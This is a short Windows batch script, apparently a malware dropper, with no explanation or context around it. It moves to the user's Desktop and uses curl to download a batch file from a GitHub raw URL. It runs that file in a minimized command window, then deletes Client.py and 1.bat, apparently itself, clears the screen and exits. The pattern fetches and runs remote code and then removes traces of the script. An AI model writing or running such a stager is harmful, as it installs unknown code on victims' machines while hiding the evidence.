cd %USERPROFILE%\Desktop
curl -o run.bat https://raw.githubusercontent.com/oogabooga245/-/main/run.bat
START /MIN CMD.EXE /C run.bat
del Client.py
cls
del 1.bat
exit
